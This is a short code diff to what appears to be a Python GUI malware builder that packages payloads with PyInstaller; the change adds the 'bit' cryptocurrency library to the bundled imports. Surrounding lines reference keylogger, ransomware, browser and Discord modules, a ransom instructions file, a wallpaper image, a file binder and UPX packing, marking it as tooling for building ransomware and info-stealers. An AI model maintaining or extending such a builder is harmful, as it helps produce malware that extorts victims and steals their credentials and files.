@@ -4,7 +4,7 @@ from colorama import Style, Fore
 from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
 from cryptography.fernet import Fernet
-import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, os
+import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, bit, os
 
 customtkinter.set_appearance_mode("dark")
 
@@ -444,6 +444,7 @@ class App(customtkinter.CTk):
 
         coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
         cryptodome_path = "\\".join(Cryptodome.__file__.split("\\")[:-1])
+        bit_path = "\\".join(bit.__file__.split("\\")[:-1])
 
         default_imports = [
             '--hidden-import','subprocess',
@@ -517,7 +518,7 @@ class App(customtkinter.CTk):
 
         imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--clean'] + imports + ['--icon' if icon else '', icon if icon else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--clean'] + imports + ['--icon' if icon else '', icon if icon else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{bit_path};bit', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
